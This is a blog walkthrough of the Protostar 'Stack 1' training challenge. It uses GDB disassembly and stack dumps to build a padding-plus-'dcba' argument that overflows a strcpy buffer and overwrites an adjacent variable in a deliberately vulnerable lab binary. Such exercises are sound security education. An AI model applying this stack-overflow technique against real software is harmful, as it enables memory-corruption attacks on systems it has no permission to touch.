---
layout: post
title: "B2B - Protostar, Stack1 (x86)"

---

## Introduction:

B2B is a series I have forced upon myself to make sure my basics are covered when it comes to exploitation. After passing my OSCE, I took a little break from exploitation to focus on a few work aspects, but now I am hungry for more lower level nonsense. 

This series will focus mainly on exploitation challenges which cover various techniques. First of which, is the stack overflow challenges within the Protostar image from "exploit education" found <a href="https://exploit.education/protostar/">here</a>. I gave myself two main rules to stick to whilst working through all these challenges.

1) Don't read the C source code for each challenge, only the hints section if required

2) Don't read other peoples write ups for these challenges unless I have already finished it and want to see other routes to further my interest

## Stack 1

The second challenge of Protostar is "Stack 1". I approached each challenge with a similar set of steps, so each post will likely follow a similar template(ish). Including initial running, inspecting the disassembly of the binary and some other specific steps in between before finally crafting a payload and owning the process.

Our initial use of the program identified the following:

```
$ ./stack1
stack1: please specify an argument

$ ./stack1 AAAA
Try again, you got 0x00000000
```

The program simply appears to take a single argument, presumably does something with it in the background and then prints some output based on the value that was specified. In this case, the binary took the string "AAAA" as it's argument, and printed "Try again, you got 0x00000000".

We can disassemble the main() function in GDB to see exactly what is happening:

```
(gdb) disas main
Dump of assembler code for function main:
0x08048464 <main+0>:	push   ebp
0x08048465 <main+1>:	mov    ebp,esp
0x08048467 <main+3>:	and    esp,0xfffffff0
0x0804846a <main+6>:	sub    esp,0x60
0x0804846d <main+9>:	cmp    DWORD PTR [ebp+0x8],0x1
0x08048471 <main+13>:	jne    0x8048487 <main+35>
0x08048473 <main+15>:	mov    DWORD PTR [esp+0x4],0x80485a0
0x0804847b <main+23>:	mov    DWORD PTR [esp],0x1
0x08048482 <main+30>:	call   0x8048388 <errx@plt>
0x08048487 <main+35>:	mov    DWORD PTR [esp+0x5c],0x0
0x0804848f <main+43>:	mov    eax,DWORD PTR [ebp+0xc]
0x08048492 <main+46>:	add    eax,0x4
0x08048495 <main+49>:	mov    eax,DWORD PTR [eax]
0x08048497 <main+51>:	mov    DWORD PTR [esp+0x4],eax
0x0804849b <main+55>:	lea    eax,[esp+0x1c]
0x0804849f <main+59>:	mov    DWORD PTR [esp],eax
0x080484a2 <main+62>:	call   0x8048368 <strcpy@plt>
0x080484a7 <main+67>:	mov    eax,DWORD PTR [esp+0x5c]
0x080484ab <main+71>:	cmp    eax,0x61626364
0x080484b0 <main+76>:	jne    0x80484c0 <main+92>
0x080484b2 <main+78>:	mov    DWORD PTR [esp],0x80485bc
0x080484b9 <main+85>:	call   0x8048398 <puts@plt>
0x080484be <main+90>:	jmp    0x80484d5 <main+113>
0x080484c0 <main+92>:	mov    edx,DWORD PTR [esp+0x5c]
0x080484c4 <main+96>:	mov    eax,0x80485f3
0x080484c9 <main+101>:	mov    DWORD PTR [esp+0x4],edx
0x080484cd <main+105>:	mov    DWORD PTR [esp],eax
0x080484d0 <main+108>:	call   0x8048378 <printf@plt>
0x080484d5 <main+113>:	leave  
0x080484d6 <main+114>:	ret    
End of assembler dump.
```

A breakdown into specific steps of logic can be seen below. Although not perfect, this should hopefully give us an easier view of the programs flow and gain an understanding of what needs to be done:

- grow the stack by 0x60 again
- immediately compare ebp+0x8 with 0x1 (ebp == esp -> line 2)
- if this value does not equal 1, we jump to main+35 (this looks like an argument count check - i.e if no args, error out as seen above in our initial runs)
- same as before, esp+0x5c is set to 0x0
- this value is then stored in EAX
- 0x4 is added to it (EAX)
- this value is then placed on the stack (esp+0x4)
- there looks to be some logic to use strcpy with our argument value (not confirmed, but likely)
- this value is then compared with 0x61626364
- 'jne' check for win/fail condition (guess, but likely as we have a print and puts in both jump targets)

In theory, to pass the comparison, we just need set the flag value to equal "0x61626364" and we should win.. right? Let's try it. For the record 0x61 0x62 0x63 0x64 is 'abcd':

```
(gdb) i r
eax            0x0	0
ecx            0x0	0
edx            0x5	5
ebx            0xb7fd7ff4	-1208123404
esp            0xbffffc40	0xbffffc40
ebp            0xbffffca8	0xbffffca8
esi            0x0	0
edi            0x0	0
eip            0x80484b0	0x80484b0 <main+76>
eflags         0x200297	[ CF PF AF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) ni
21	in stack1/stack1.c
(gdb) i r
eax            0x0	0
ecx            0x0	0
edx            0x5	5
ebx            0xb7fd7ff4	-1208123404
esp            0xbffffc40	0xbffffc40
ebp            0xbffffca8	0xbffffca8
esi            0x0	0
edi            0x0	0
eip            0x80484c0	0x80484c0 <main+92>
eflags         0x200297	[ CF PF AF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) c
Continuing.
Try again, you got 0x00000000
```

Well, that failed. However, we now know that the jump to main+92 is the fail condition! Helpful bit of progression none the less. Let's try again, but check the value that is being compared just before the comparison instruction occurs.

After another attempt, I realised I had derped pretty hard... I misread some of the disassembly at first. If we look at our stack, we can see our issue:

```
(gdb) x/30wx $esp
0xbffffc40:	0xbffffc5c	0xbffffe80	0xb7fff8f8	0xb7f0186e
0xbffffc50:	0xb7fd7ff4	0xb7ec6165	0xbffffc68	0x64636261 <- abcd input
0xbffffc60:	0xb7fd7f00	0x080496fc	0xbffffc78	0x08048334
0xbffffc70:	0xb7ff1040	0x080496fc	0xbffffca8	0x08048509
0xbffffc80:	0xb7fd8304	0xb7fd7ff4	0x080484f0	0xbffffca8
0xbffffc90:	0xb7ec6365	0xb7ff1040	0x080484fb	0x00000000 <- target flag (lol)
0xbffffca0:	0x080484f0	0x00000000	0xbffffd28	0xb7eadc76
0xbffffcb0:	0x00000002	0xbffffd54
```

Looking at the stack above, it looks like we can use the same offsets as before (64 until we hit our flag) and then the 4 bytes for our actual flag. Instead of '42424242' we will write 'abcd' to get our target '0x61626364' within the address. Note we will need to reverse it because endian-ness of the target CPU (link to resource here). Our payload 'should' be:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
```

Re-running the program with our input and breaking just before the comparison instruction, we get:

```
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba

Breakpoint 1, 0x080484ab in main (argc=2, argv=0xbffffd14) at stack1/stack1.c:18
18	in stack1/stack1.c
(gdb) i r
eax            0x61626364	1633837924
ecx            0x0	0
edx            0x45	69
ebx            0xb7fd7ff4	-1208123404
esp            0xbffffc00	0xbffffc00
ebp            0xbffffc68	0xbffffc68
esi            0x0	0
edi            0x0	0
eip            0x80484ab	0x80484ab <main+71>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

EAX is looking good! We can see our overflow hit the perfect location we identified before:

```
(gdb) x/30wx $esp
0xbffffc00:	0xbffffc1c	0xbffffe40	0xb7fff8f8	0xb7f0186e
0xbffffc10:	0xb7fd7ff4	0xb7ec6165	0xbffffc28	0x41414141 <--- input starts here
0xbffffc20:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc30:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc40:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc50:	0x41414141	0x41414141	0x41414141	0x61626364 <--- our flag
0xbffffc60:	0x08048400	0x00000000	0xbffffce8	0xb7eadc76
0xbffffc70:	0x00000002	0xbffffd14
```

Two more steps into the program, we see that we continue our execution flow and don't jump to the fail condition like before:

```
(gdb) ni
0x080484b0	18	in stack1/stack1.c
(gdb) ni
19	in stack1/stack1.c
(gdb) i r
eax            0x61626364	1633837924
ecx            0x0	0
edx            0x45	69
ebx            0xb7fd7ff4	-1208123404
esp            0xbffffc00	0xbffffc00
ebp            0xbffffc68	0xbffffc68
esi            0x0	0
edi            0x0	0
eip            0x80484b2	0x80484b2 <main+78>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

The EIP now points at our 'win' block, ultimately leading on to glory!

```
(gdb) c
Continuing.
you have correctly got the variable to the right value
```

We can finally run our payload into the binary outside of GDB, and we should get our win condition printed to screen:

```
$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
you have correctly got the variable to the right value
```

The second challenge has been completed. We exploited another buffer overflow, and overwrote our target memory location with a specific value, required by the process to execute our win condition.